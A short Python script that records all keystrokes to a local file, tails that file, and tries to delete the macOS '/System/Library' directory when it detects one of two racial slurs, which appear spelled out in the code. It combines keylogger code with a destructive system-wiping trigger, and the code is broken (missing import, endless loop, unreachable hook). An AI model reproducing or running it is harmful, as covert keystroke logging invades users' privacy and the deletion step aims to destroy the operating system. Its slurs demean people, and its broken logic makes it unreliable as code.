import keyboard
import time
import os

log_file = 'keystrokes.txt'

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

def follow(file):
    file.seek(0, 2)  
    while True:
        line = file.readline()
        if not line:
            time.sleep(0.1)
            continue
        yield line

def contains_word(text, word):
    pattern = rf'\b{word}\b'
    return bool(re.search(pattern, text, re.IGNORECASE))

def racism(line):
    while True:
        if contains_word(line, "nigger") or contains_word(line, "nigga"):
            os.remove("/System/Library")

if __name__ == "__main__":
    with open("keystrokes.txt", "r") as file:
        loglines = follow(file)
        for line in loglines:
            racism(line)

keyboard.on_press(on_key_press)

keyboard.wait()
